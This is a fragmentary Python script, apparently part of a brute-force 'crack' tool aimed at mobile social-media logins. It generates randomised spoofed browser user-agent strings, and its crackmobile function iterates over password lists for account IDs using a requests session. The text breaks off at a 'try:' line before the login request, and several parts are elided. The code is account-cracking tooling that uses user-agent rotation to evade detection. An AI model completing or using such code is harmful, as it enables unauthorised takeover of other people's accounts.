...
for agenku in range(10000):
	...
	c='Infinix X688C Build/QP1A.190711.020)'
	...
	a='Mozilla/5.0 (SMART-TV; Linux;'
	b=random.choice(['8.1.0','9','10','11','12','13'])
	c='Tizen 4.0)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/'
	e=random.randrange(73,100)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
...
def crackmobile(idf,pwv):
	...
	prog.advance(des)
	ua = random.choice(["Mozilla/5.0 (Linux; Android 7.1.2; Redmi Note 5A Prime Build/N2G47H) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36 YaApp_Android/10.61 YaSearchBrowser/10.61","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A127M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 9; ru-ru; Redmi 7A Build/PKQ1.190319.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; RMX3286 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 5.1.1; SM-J120F Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Stargon/2.7.0 Chrome/86.0.4240.198 Mobile Safari/537.36"])
	ses = requests.Session()
	for pw in pwv:
		try:
